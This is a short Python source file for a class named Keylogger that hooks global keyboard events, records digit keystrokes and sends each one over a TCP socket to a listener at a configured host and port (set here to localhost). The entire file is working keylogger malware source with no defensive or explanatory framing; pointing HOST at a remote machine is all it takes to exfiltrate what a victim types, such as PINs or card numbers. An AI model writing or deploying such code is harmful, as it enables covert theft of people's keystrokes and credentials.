import keyboard
import socket

HOST = '127.0.0.1'
PORT= 65432

class Keylogger:
    def __init__(self):
        self.fine = True
        self.key_list = []

    def exit_me(self):
        print("Catched: ", self.key_list)
        self.fine = False 

    def start_logging(self):
        keyboard.add_hotkey('esc', self.exit_me)  
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
          try:
            client_socket.connect((HOST, PORT))

            while self.fine:
                event = keyboard.read_event(suppress=False)
                if event.event_type == keyboard.KEY_UP and event.name.isdigit():
                  self.key_list.append(event.name)
                  client_socket.send(event.name.encode())
                  
          except Exception as e:
            print(e)
            print("Connection closed")
            client_socket.close()

if __name__ == "__main__":
    logger = Keylogger()
    logger.start_logging()
